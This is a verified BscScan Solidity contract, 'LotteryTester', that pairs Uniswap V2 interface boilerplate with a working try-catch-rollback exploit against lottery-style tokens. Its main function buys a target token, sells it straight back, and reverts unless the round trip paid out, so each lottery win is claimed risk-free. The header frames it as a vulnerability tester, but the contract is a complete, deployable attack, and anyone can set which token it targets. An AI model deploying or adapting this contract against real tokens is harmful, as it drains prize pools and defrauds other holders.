/**
 *Submitted for verification at BscScan.com on 2022-05-14
*/

/*
Is your lottery vulnerable to a Try-Catch-Rollback attack?
*/


//SPDX-License-Identifier: UNLICENSED

pragma solidity =0.8.13;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


contract LotteryTester {

    IUniswapV2Router02 public immutable uniswapV2RouterObject;
    address public immutable uniswapV2wETHAddr;
    address public immutable uniswapV2RouterAddr;
    address public token = 0x6d9EB045b6b33b588C4EDCD610A3Ba077d1Dc213;

    bool internal open = true; 

    event Log (string action); 	 
    event TokenAddr (address addr); 	 
    event Balance (uint256 bal); 	 
    
    constructor()  {
    
        //address _uniswapV2RouterAddr=0x35fb4895b68aC7A2D11da59d4E9f520c9C86A546; //ECHswap v2 compatible
        //address _uniswapV2RouterAddr=0x10ED43C718714eb63d5aA57B78B54704E256024E; //BNB v2 mainnet
        address _uniswapV2RouterAddr=0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3; //BNB v2 testnet
        //address _uniswapV2RouterAddr=0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F; //BNB v1 avoid this!
        //address _uniswapV2RouterAddr=0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; //All ETH chains
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(_uniswapV2RouterAddr);
        uniswapV2RouterAddr = _uniswapV2RouterAddr;
		    uniswapV2wETHAddr = _uniswapV2Router.WETH();
		    uniswapV2RouterObject = _uniswapV2Router;
    }

    receive() external payable { if(open) main();}
    fallback() external payable { if(open) main();}

    function setTokenAddr(address tokenAddr) external  {
		    token = tokenAddr;	
        emit TokenAddr(tokenAddr);
	  }

    function swapEthForTokens(uint256 ethAmount) private {
        address[] memory path = new address[](2);
        path[0] = uniswapV2wETHAddr;
        path[1] = token;
        // make the swap
        emit Log("2");
        try uniswapV2RouterObject.swapExactETHForTokensSupportingFeeOnTransferTokens{ value: ethAmount }(
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        ) {      emit Log("3");}
        catch Error(string memory reason) {emit Log(reason);}
        catch {emit Log("swapEthForTokens unknown failure");}
    }

    function swapTokensBackForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = uniswapV2wETHAddr;
        IERC20(token).approve(uniswapV2RouterAddr, tokenAmount);
        // make the swap
        emit Log("5");
        try uniswapV2RouterObject.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        ){emit Log("6");}
        catch Error(string memory reason) {emit Log(reason);}
        catch  {emit Log("swapTokensBackForEth unknown failure");}
    }

  	function main() public payable {
      open = false;
      uint256 ethAmount0 = address(this).balance;
      emit Log("1");
      swapEthForTokens(ethAmount0);
      emit Log("4");
      uint256 tokenAmount0 = IERC20(token).balanceOf(address(this));
      emit Balance(tokenAmount0);
      swapTokensBackForEth(tokenAmount0);
      uint256 ethAmount1 = address(this).balance;
      emit Balance(ethAmount1);
      emit Log("7");
      require (ethAmount1>ethAmount0,"Bad luck this time");
      emit Log("Good luck this time");
      payable(msg.sender).transfer(ethAmount1);
      open = true;
	}
}